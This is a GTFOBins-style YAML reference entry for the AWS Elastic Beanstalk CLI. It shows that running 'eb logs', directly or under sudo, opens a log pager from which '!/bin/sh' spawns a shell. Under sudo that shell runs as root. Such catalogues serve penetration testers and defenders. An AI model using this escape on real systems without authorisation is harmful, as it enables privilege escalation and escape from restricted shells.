---
functions:
  shell:
    - description: This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connect to AWS instance via EB-CLI.
      code: |
        eb logs
        !/bin/sh
  sudo:
    - description: This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connect to AWS instance via EB-CLI.
      code: |
        sudo eb logs
        !/bin/sh
---
